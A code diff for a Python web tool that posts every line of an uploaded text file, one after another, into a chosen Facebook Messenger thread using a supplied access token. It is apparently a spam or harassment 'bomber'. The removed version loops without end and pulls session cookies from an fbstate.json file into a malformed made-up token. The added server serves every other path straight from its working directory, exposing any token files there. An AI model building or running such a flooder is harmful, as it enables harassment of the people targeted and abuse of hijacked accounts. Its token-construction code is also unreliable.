@@ -1,270 +1,228 @@
-import os
-from flask import Flask, request
+#!/usr/bin/env python3
+import http.server
+import socketserver
+import cgi
 import requests
 import time
 import json
 import os
 
-app = Flask(__name__)
-app.debug = True
+PORT = 5000
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-def get_access_token_from_fbstate(fbstate_path):
-    """Extract access token from C3C fbstate.json file"""
-    try:
-        if os.path.exists(fbstate_path):
-            with open(fbstate_path, 'r', encoding='utf-8') as f:
-                fbstate_data = json.load(f)
+class MessengerHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
             
-            # Extract access token from fbstate
-            if 'appState' in fbstate_data:
-                for item in fbstate_data['appState']:
-                    if 'key' in item and item['key'] == 'access_token':
-                        return item['value']
-            
-            # Alternative extraction method
-            if 'cookies' in fbstate_data:
-                for cookie in fbstate_data['cookies']:
-                    if 'name' in cookie and cookie['name'] == 'c_user':
-                        user_id = cookie.get('value', 'Unknown')
-                    if 'name' in cookie and cookie['name'] == 'xs':
-                        xs_token = cookie.get('value', '')
-                        if xs_token:
-                            return f"EAAD{user_id}{xs_token}"
-        
-        return None
-    except Exception as e:
-        print(f"Error reading fbstate: {e}")
-        return None
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        # Get access token from fbstate or direct input
-        access_token_source = request.form.get('accessTokenSource')
-        access_token = None
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        if access_token_source == 'fbstate':
-            fbstate_path = request.form.get('fbstatePath', 'fbstate.json')
-            access_token = get_access_token_from_fbstate(fbstate_path)
-            if not access_token:
-                return "❌ Failed to extract access token from fbstate file"
-        else:
-            access_token = request.form.get('accessToken')
-
-        if not access_token:
-            return "❌ No access token provided"
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode('utf-8').splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    
-                    if response.status_code == 200:
-                        print(f"✅ Message sent: {message}")
-                    else:
-                        print(f"❌ Failed to send: {message} - Status: {response.status_code}")
-                    
-                    time.sleep(time_interval)
-                    
-            except Exception as e:
-                print(f"⚠️ Error: {e}")
-                time.sleep(30)
-
-    return '''
-
+            html_content = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>💖 MARINA KHAN MESSENGER TOOL 💖</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
-    body{
+    body {
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
       min-height: 100vh;
-      font-family: 'Arial', sans-serif;
     }
-    .container{
-      max-width: 600px;
-      background-color: #fff;
-      border-radius: 15px;
-      padding: 30px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    .container {
+      max-width: 500px;
+      background: white;
+      border-radius: 10px;
+      padding: 20px;
       margin: 0 auto;
-      margin-top: 30px;
-      margin-bottom: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
     }
-    .header{
+    h1 {
       text-align: center;
-      padding-bottom: 20px;
-      color: #fff;
+      color: white;
     }
-    .btn-submit{
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input, textarea {
       width: 100%;
-      margin-top: 10px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      border: none;
+      padding: 8px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
       padding: 12px;
-      font-weight: bold;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 20px;
-      color: #fff;
-    }
-    .form-label{
-      font-weight: bold;
-      color: #333;
-    }
-    .nav-tabs .nav-link.active{
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       color: white;
       border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .footer {
+      text-align: center;
+      color: white;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <header class="header mt-4">
-    <h1>💖 MARINA KHAN MESSENGER TOOL 💖</h1>
-    <p>Advanced Message Sender with C3C fbstate Support</p>
-  </header>
-
+  <h1>💖 MARINA KHAN MESSENGER TOOL 💖</h1>
+  
   <div class="container">
-    <ul class="nav nav-tabs mb-4" id="myTab" role="tablist">
-      <li class="nav-item" role="presentation">
-        <button class="nav-link active" id="fbstate-tab" data-bs-toggle="tab" data-bs-target="#fbstate" type="button" role="tab">C3C fbstate</button>
-      </li>
-      <li class="nav-item" role="presentation">
-        <button class="nav-link" id="token-tab" data-bs-toggle="tab" data-bs-target="#token" type="button" role="tab">Direct Token</button>
-      </li>
-    </ul>
-
-    <div class="tab-content" id="myTabContent">
-      <!-- C3C fbstate Tab -->
-      <div class="tab-pane fade show active" id="fbstate" role="tabpanel">
-        <form action="/" method="post" enctype="multipart/form-data">
-          <input type="hidden" name="accessTokenSource" value="fbstate">
-          
-          <div class="mb-3">
-            <label for="fbstatePath" class="form-label">📁 C3C fbstate.json Path:</label>
-            <input type="text" class="form-control" id="fbstatePath" name="fbstatePath" value="fbstate.json" required>
-            <div class="form-text">Path to your fbstate.json file from C3C</div>
-          </div>
-          
-          <div class="mb-3">
-            <label for="threadId" class="form-label">💬 Target Thread ID:</label>
-            <input type="text" class="form-control" id="threadId" name="threadId" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="kidx" class="form-label">👤 Sender Name:</label>
-            <input type="text" class="form-control" id="kidx" name="kidx" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="txtFile" class="form-label">📄 Messages File (.txt):</label>
-            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="time" class="form-label">⏰ Delay (seconds):</label>
-            <input type="number" class="form-control" id="time" name="time" value="5" required>
-          </div>
-          
-          <button type="submit" class="btn btn-primary btn-submit">🚀 Start Sending Messages</button>
-        </form>
+    <form action="/send" method="post" enctype="multipart/form-data">
+      <div class="form-group">
+        <label>🔑 Access Token:</label>
+        <input type="text" name="accessToken" required>
       </div>
-
-      <!-- Direct Token Tab -->
-      <div class="tab-pane fade" id="token" role="tabpanel">
-        <form action="/" method="post" enctype="multipart/form-data">
-          <input type="hidden" name="accessTokenSource" value="direct">
-          
-          <div class="mb-3">
-            <label for="accessToken" class="form-label">🔑 Access Token:</label>
-            <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="threadId2" class="form-label">💬 Target Thread ID:</label>
-            <input type="text" class="form-control" id="threadId2" name="threadId" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="kidx2" class="form-label">👤 Sender Name:</label>
-            <input type="text" class="form-control" id="kidx2" name="kidx" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="txtFile2" class="form-label">📄 Messages File (.txt):</label>
-            <input type="file" class="form-control" id="txtFile2" name="txtFile" accept=".txt" required>
-          </div>
-          
-          <div class="mb-3">
-            <label for="time2" class="form-label">⏰ Delay (seconds):</label>
-            <input type="number" class="form-control" id="time2" name="time" value="5" required>
-          </div>
-          
-          <button type="submit" class="btn btn-primary btn-submit">🚀 Start Sending Messages</button>
-        </form>
+      
+      <div class="form-group">
+        <label>💬 Thread ID:</label>
+        <input type="text" name="threadId" required>
       </div>
-    </div>
+      
+      <div class="form-group">
+        <label>👤 Sender Name:</label>
+        <input type="text" name="kidx" required>
+      </div>
+      
+      <div class="form-group">
+        <label>📄 Messages File:</label>
+        <input type="file" name="txtFile" accept=".txt" required>
+      </div>
+      
+      <div class="form-group">
+        <label>⏰ Delay (seconds):</label>
+        <input type="number" name="time" value="5" required>
+      </div>
+      
+      <button type="submit">🚀 Start Sending Messages</button>
+    </form>
   </div>
-
-  <footer class="footer">
-    <p>&copy; 2024 💖 Developed by Marina Khan - All rights reserved 💖</p>
-    <p>🔧 Advanced Messenger Tool with C3C fbstate Support</p>
-    <p>⚡ Auto Message Sender for Facebook Messenger</p>
-  </footer>
-
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
-  <script>
-    // Sync form fields between tabs
-    document.getElementById('threadId').addEventListener('input', function() {
-      document.getElementById('threadId2').value = this.value;
-    });
-    document.getElementById('threadId2').addEventListener('input', function() {
-      document.getElementById('threadId').value = this.value;
-    });
-    
-    document.getElementById('kidx').addEventListener('input', function() {
-      document.getElementById('kidx2').value = this.value;
-    });
-    document.getElementById('kidx2').addEventListener('input', function() {
-      document.getElementById('kidx').value = this.value;
-    });
-    
-    document.getElementById('time').addEventListener('input', function() {
-      document.getElementById('time2').value = this.value;
-    });
-    document.getElementById('time2').addEventListener('input', function() {
-      document.getElementById('time').value = this.value;
-    });
-  </script>
+  
+  <div class="footer">
+    <p>&copy; 2024 💖 Developed by Marina Khan</p>
+    <p>⚡ Simple Messenger Tool</p>
+  </div>
 </body>
 </html>
-    '''
+            '''
+            self.wfile.write(html_content.encode())
+        else:
+            super().do_GET()
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    def do_POST(self):
+        if self.path == '/send':
+            try:
+                # Parse form data
+                form = cgi.FieldStorage(
+                    fp=self.rfile,
+                    headers=self.headers,
+                    environ={'REQUEST_METHOD': 'POST',
+                           'CONTENT_TYPE': self.headers['Content-Type']}
+                )
+                
+                # Get form values
+                access_token = form['accessToken'].value
+                thread_id = form['threadId'].value
+                mn = form['kidx'].value
+                time_interval = int(form['time'].value)
+                
+                # Get file content
+                file_item = form['txtFile']
+                if file_item.file:
+                    messages = file_item.file.read().decode('utf-8').splitlines()
+                    
+                    # Send response first
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/html')
+                    self.end_headers()
+                    
+                    response_html = '''
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>✅ Messages Sent</title>
+                        <style>
+                            body { 
+                                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                                color: white; 
+                                font-family: Arial; 
+                                text-align: center; 
+                                padding: 50px;
+                            }
+                            .container {
+                                background: white;
+                                color: #333;
+                                padding: 30px;
+                                border-radius: 10px;
+                                max-width: 500px;
+                                margin: 0 auto;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="container">
+                            <h1>✅ Messages Started Sending!</h1>
+                            <p>Check your terminal for progress...</p>
+                            <a href="/">← Back to Tool</a>
+                        </div>
+                    </body>
+                    </html>
+                    '''
+                    self.wfile.write(response_html.encode())
+                    
+                    # Start sending messages in background
+                    self.send_messages(access_token, thread_id, mn, messages, time_interval)
+                    
+                else:
+                    self.send_error(400, "No file uploaded")
+                    
+            except Exception as e:
+                self.send_error(500, f"Error: {str(e)}")
+        else:
+            self.send_error(404)
+
+    def send_messages(self, access_token, thread_id, mn, messages, time_interval):
+        """Send messages to the thread"""
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
+            'Accept': 'application/json',
+        }
+        
+        print(f"🚀 Starting to send {len(messages)} messages...")
+        
+        for i, message1 in enumerate(messages):
+            try:
+                message = f"{mn} {message1}"
+                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
+                parameters = {'access_token': access_token, 'message': message}
+                
+                response = requests.post(api_url, data=parameters, headers=headers)
+                
+                if response.status_code == 200:
+                    print(f"✅ [{i+1}/{len(messages)}] Sent: {message}")
+                else:
+                    print(f"❌ [{i+1}/{len(messages)}] Failed: {message}")
+                
+                time.sleep(time_interval)
+                
+            except Exception as e:
+                print(f"⚠️ Error: {e}")
+                time.sleep(30)
+
+print(f"🚀 Server starting on port {PORT}...")
+print(f"📱 Open: http://localhost:{PORT}")
+print("💖 By: Marina Khan")
+
+with socketserver.TCPServer(("", PORT), MessengerHandler) as httpd:
+    httpd.serve_forever()
